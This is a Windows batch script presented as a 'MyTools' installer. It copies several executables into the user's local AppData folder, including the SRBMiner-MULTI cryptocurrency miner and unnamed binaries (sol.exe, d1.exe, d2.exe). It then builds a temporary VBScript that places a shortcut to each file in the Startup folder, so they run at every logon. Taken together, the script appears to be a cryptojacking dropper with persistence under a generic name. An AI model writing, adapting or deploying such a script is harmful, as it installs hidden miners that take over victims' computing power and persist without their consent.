@echo off
title MyTools Installer - Will NOT close automatically
echo [INFO] Starting installer...

SETLOCAL ENABLEDELAYEDEXPANSION

SET "FILES=ClearLock.ini start.bat sol.exe d1.exe d2.exe SRBMiner-MULTI.exe startS.bat"
SET "INSTALL_DIR=%LOCALAPPDATA%\MyTools"
SET "STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
SET "LOGFILE=%INSTALL_DIR%\install_log.txt"

if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%" 2>nul

:: Write log header
echo [%DATE% %TIME%] Installer started. > "%LOGFILE%"
echo [%DATE% %TIME%] Using Startup folder: %STARTUP_FOLDER% >> "%LOGFILE%"

:: --- Build VBS safely, line by line ---
set "VBS=%TEMP%\sc.vbs"
del /f /q "%VBS%" 2>nul

echo Set args = WScript.Arguments >> "%VBS%"
echo If args.Count ^< 3 Then WScript.Quit(1) >> "%VBS%"
echo Set fso = CreateObject("Scripting.FileSystemObject") >> "%VBS%"
echo Set shl = CreateObject("WScript.Shell") >> "%VBS%"
echo target = args(0) >> "%VBS%"
echo folder = args(1) >> "%VBS%"
echo name = args(2) >> "%VBS%"
echo If Not fso.FolderExists(folder) Then fso.CreateFolder(folder) >> "%VBS%"
echo linkPath = fso.BuildPath(folder, name ^& ".lnk") >> "%VBS%"
echo Set lnk = shl.CreateShortcut(linkPath) >> "%VBS%"
echo lnk.TargetPath = target >> "%VBS%"
echo lnk.WorkingDirectory = fso.GetParentFolderName(target) >> "%VBS%"
echo lnk.Save >> "%VBS%"

echo [INFO] VBS helper created.

:: --- Process each file ---
for %%F in (%FILES%) do (
    set "src=%~dp0%%F"
    if exist "!src!" (
        echo [INFO] Copying %%F...
        copy /Y "!src!" "%INSTALL_DIR%\" >nul
        if exist "%INSTALL_DIR%\%%F" (
            echo [INFO] Creating shortcut for %%F...
            cscript //nologo "%VBS%" "%INSTALL_DIR%\%%F" "%STARTUP_FOLDER%" "%%~nF"
        )
    ) else (
        echo [WARN] %%F not found!
    )
    timeout /t 1 >nul
)

del /f /q "%VBS%" 2>nul
echo [%DATE% %TIME%] Finished. >> "%LOGFILE%"

echo.
echo DONE.
echo Check Startup folder: %STARTUP_FOLDER%
echo Log: %LOGFILE%
echo.

pause
